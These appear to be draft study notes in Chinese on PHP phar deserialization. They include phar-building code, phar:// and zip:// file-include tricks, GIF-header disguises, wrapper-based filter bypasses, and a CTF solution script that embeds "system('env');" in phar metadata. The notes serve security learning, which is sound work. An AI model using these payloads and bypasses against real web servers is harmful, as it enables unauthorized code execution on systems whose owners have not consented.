---
title: "phar反序列化"
date: "2026-02-16"
lastmod: 2026-09-16T14:02:08.583Z
slug: "phar反序列化学习"
summary: "简单整理"
tags:
  - "php"
  - "phar"
categories: []
draft: true
cover: ""
params:
  protected: false
---

启程文章：https://www.freebuf.com/articles/web/291992.html

更全面的web知识介绍：https://paper.seebug.org/680/

### Phar文件结构

phar文件是php里类似于JAR的一种打包文件本质上是一种压缩文件，在PHP 5.3 或更高版本中默认开启，一个phar文件一个分为四部分

```
a stub
可以理解为一个标志，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面内容不限，但必须以__HALT_COMPILER();来结尾，否则phar扩展将无法识别这个文件为phar文件
```

```
a manifest describing the contents
phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方
```

![img](https://images.seebug.org/content/images/2018/08/24388aaa-6ea4-4856-8fb1-fbf29deb5dca.png-w331s)

```
the file contents
被压缩文件的内容
```

```
[optional] a signature for verifying Phar integrity (phar file format only)
签名，放在文件末尾
```

格式：![img](https://images.seebug.org/content/images/2018/08/f87194d9-81d6-4786-9339-8a7d4ac596d5.png-w331s)



### 生成Phar文件

在php内部内置了一个Phar类来处理相关操作

```php
<?php
    // 1. 定义一个类，用于触发反序列化。
    // 在实际攻击中，这个类通常包含 __destruct 或 __wakeup 等魔术方法。
    class TestObject {
    }

// 2. 清理环境：如果当前目录下已存在同名文件，先将其删除，确保生成的是全新的文件。
    @unlink("phar.phar");
// 3. 初始化 Phar 对象：创建一个名为 "phar.phar" 的压缩档案实例。
    $phar = new Phar("phar.phar"); //后缀名必须为phar
// 4. 开启缓冲区：在内存中构建 Phar 内容，直到调用 stopBuffering() 才会真正写入磁盘。
    $phar->startBuffering();
// 5. 设置 Stub（存根）：这是 Phar 的文件头，PHP 靠它识别文件类型。
    // 关键点：必须包含 __HALT_COMPILER(); 即使后缀改为 .jpg，PHP 依然能识别它是 Phar。
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
// 6. 准备 Payload：实例化我们要进行序列化的对象。
    $o = new TestObject();
// 7. 写入元数据：将对象 $o 存入 Phar 的 manifest 区域。
    // 重点：此时 PHP 会自动对 $o 进行 serialize()，这是漏洞触发的核心点。
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
// 8. 添加伪装文件：Phar 必须包含至少一个有效文件才能成功构建。
    // 这里向压缩包内添加了一个名为 test.txt、内容为 "test" 的文件。
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
// 9. 停止缓冲并签名：计算文件的校验和（签名）并正式生成文件到磁盘。
    //签名自动计算
    $phar->stopBuffering();
?>
```

注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件

直接在本地php所在处寻找phar.ini

访问之后会在同目录生成 phar.phar 文件，xxd 命令查看文件结构。

**meta-data**是以序列化的形式存储的

php一大部分的文件系统函数在通过`phar://`伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：

![image-20211018194419673](https://image.3001.net/images/20211018/1634557716_616d5f14f07e19096eb08.png!small)

比如说：

```php
<?php 
    class TestObject {
        public function __destruct() {
            echo 'Destruct called';
        }
    }

    $filename = 'phar://phar.phar/test.txt';
    file_get_contents($filename); 
?>
```

然后将会回显：Destruct called

此时，此处 **weakup 等方法**不会被调用

这样就可以在不调用unserialize()的情况下进行反序列化操作

看：https://paper.seebug.org/680/

### Phar协议文件包含

phar协议要求：

- php大于5.3.0
- 需要将php.ini的参数phar.readonly设置为off

因为phar文件本质就是以中压缩文件，所以可以使用phar伪协议读取执行

很多网站都采用单一入口模式来作为网站文件加载模式

一个题目源码范式：

```php
<?php
//单一入口模式
error_reporting(0); //关闭错误显示
$file=addslashes($_GET['r']); //接收文件名
$action=$file==''?'index':$file; //判断为空或者等于index
include($action.'.php'); //载入相应文件
?>
```

此时就存在文件包含漏洞，可以利用伪协议读取文件源码

但只能读取php文件，此时如果：

如果该网站同时存在上传图片的功能，这时就可以利用phar反序列化漏洞

1.写一个 test.php，写入要执行的命令

```
<?php phpinfo();?>
```

2. test.php 压缩为 test.zip 
3. 注意：压缩时选择仅存储，在文件上传处上传 test.zip 文件

4. test.zip 文件后缀改为 jpg，上传 jpg 文件，在 url 中访问

```
?r=phar://pic/test.jpg/test
```

此时则利用了phar伪协议；

zip文件包含

和phar用法不同效果一致

```
include($file.'.jpg');
# \x00的截断在php<5.3.4版本
```

将php文件后缀改为jpg（因为是include .jpg），然后用压缩软件压缩为 zip格式，再将 zip 文件后缀名改为 jpg（绕过限制方便图片上传）

```
/?r=zip://pic/test4.jpg%23test
读取
pic是图片保存目录////现在一般很多是uploads目录
```

这个例子只是利用了phar伪协议解析文件，并没有利用反序列化

### Phar反序列化漏洞利用

```
漏洞利用条件

phar文件要能够上传到服务器端。

要有可用的魔术方法作为“跳板”。

文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤
```

示例：

```

```

### 将phar伪造成其他格式的文件

如果文件上传界面后端代码会检查文件类型的话，就需要将 phar 文件未造成其他格式文件

```
$_FILES["file"]["type"]=="image/gif"
```

由于php识别phar文件是通过其文件头的stub，更确切一点来说是`__HALT_COMPILER();`这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件

```
<?php
    class TestObject {
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar");
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```

### 绕过phar关键字检测

在第一个实例中，文件成功上传之后使用 phar 伪协议去读取文件，但是如果后端检测参数不能以 phar 开头的话，就需要绕过

```
if (preg_match("/^php|^file|^gopher|^http|^https|^ftp|^data|^phar|^smtp|^dict|^zip/i",$filename){
    die();
}
```

绕过方法

```
// Bzip / Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过
compress.bzip://phar:///test.phar/test.txt
compress.bzip2://phar:///home/sx/test.phar/test.txt
compress.zlib://phar:///home/sx/test.phar/test.txt
php://filter/resource=phar:///test.phar/test.txt
// 还可以使用伪协议的方法绕过
php://filter/read=convert.base64-encode/resource=phar://phar.phar
```

### 绕过__HALT_COMPILER特征检测

```
if (preg_match("/</?|php|HALT_COMPILER/i",$filename){
    die();
}
```

因为phar中的`a stub`字段必须以`__HALT_COMPILER();`字符串来结尾，否则`phar`扩展将无法识别这个文件为`phar`文件，所以这段字符串不能省略，只能绕过

**方法一：**

首先将 phar 文件使用 gzip 命令进行压缩，可以看到压缩之后的文件中就没有了`__HALT_COMPILER()`，将 phar.gz 后缀改为 png（png文件可以上传）

此时：
file_un.php?filename=phar://pic/phar.phar.gz/phar.phar

file_un.php中包含__destruct并且可以被触发

**方法二**

将phar的内容写进压缩包注释中，也同样能够反序列化成功，压缩为zip也会绕过该正则

```
$phar_file = serialize($exp);
    echo $phar_file;
    $zip = new ZipArchive();
    $res = $zip->open('1.zip',ZipArchive::CREATE); 
    $zip->addFromString('crispr.txt', 'file content goes here');
    $zip->setArchiveComment($phar_file);
    $zip->close();
```

这篇文章在php源码角度给出分析：https://www.anquanke.com/post/id/240007

> phar反序列化过程中，对metadata进行解析的时候会进行`php_var_unserialize()`将Phar中的metadata进行反序列化

### 脚本记录：

工坊题目8：

```php
<?php
// 假设题目环境中已经定义了 class a (或者类似的类)
class a {
    public $b;
}

$bb = new a('');
$bb->b = "system('env');"; // 这里的 b 属性可能在析构时被 eval 或 assert

$p = new Phar("test2.phar");
$p->startBuffering();

// 设置 Stub，加上 GIF89a 绕过文件头检查
$p->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>");

// 核心：将构造好的对象放入 Metadata
$p->setMetadata($bb); 

// 随便添加一个文件内容
$p->addFromString("hsy.txt", "hsygood");

$p->stopBuffering();
echo "Payload generated: test.phar";


//要生成文件：终端中输入  D:\phpbuild\php.exe -d phar.readonly=0 "c:\Users\lilyzero207\Desktop\php\phar.php"
?>

```

